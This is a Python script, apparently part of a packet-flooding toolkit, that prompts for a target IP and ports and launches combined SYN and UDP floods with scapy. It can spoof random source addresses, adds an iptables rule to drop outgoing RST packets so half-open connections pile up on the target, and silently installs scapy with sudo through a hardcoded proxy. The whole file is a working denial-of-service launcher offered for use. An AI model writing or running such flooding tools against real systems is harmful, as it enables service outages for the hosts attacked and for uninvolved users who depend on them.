import os
import sys
from utils.logger_util import get_logger
from utils.ifaces_util import get_ifaces

# set logger
logger = get_logger('mix_flood_logger', './log/mix_flood.log')

try:
    from scapy.all import *
except ImportError as e:
    try:
        os.system('sudo pip3 install scapy --proxy="http://10.50.128.110:3128"')
        logger.debug('scapy have been installed successfully! ! !')
        from scapy.all import *
    except Exception as e:
        logger.debug(f"======scapy installation failed======\n{e}\n")

from utils.thread_util_refactor import packThread

# verify that the user running the script is root
if os.getuid() != 0:
    logger.error('You need to run this program as root.')
    sys.exit(1)

# input the parameters to attack
dst_ip = input('Input IP :')
tcp_port = input('Attack Port of SYN Flood :')
udp_port = input('Attack Port of UDP Flood :')
src_type = input('Choose random or local source ip, please input r or l : ')

# get the default gateway and nicname
ifaces_info = get_ifaces()
iface_ip = input('Please select the interface to send packets by inputting IP address:')
iface_name = ifaces_info[iface_ip][0]

logger.debug('The dst IP is %s, the interface used to send packets is %s.' % (dst_ip, iface_name))

# select the source IP type
src_ip = ""
if src_type == 'r' or src_type == 'R':
    src_ip = RandIP()
    logger.debug('The src IP uses random mode.')
elif src_type == 'l' or src_type == 'L':
    src_ip = iface_ip
    logger.debug('The src IP uses the local host IP.')

'''
By default the Linux kernel sends an RST in response to a SYN-ACK received from the server. 
This is because of a lack of communication between scapy and the kernel. 
For this reason an IPTABLES rule needs to be created to block any outgoing RST packets.
'''
try:
    os.system('iptables -A OUTPUT -p tcp -s %s --tcp-flags RST RST -j DROP' % src_ip)
except Exception as e:
    logger.debug(f"======iptables setup failed======\n{e}\n")

if __name__ == '__main__':
    logger.info('Sending packets, please wait a moment! ! !')
    th = packThread(0, src_ip, dst_ip, iface_name, logger, send_pack_type='l')
    th.protocolThread(tcp_port, udp_port)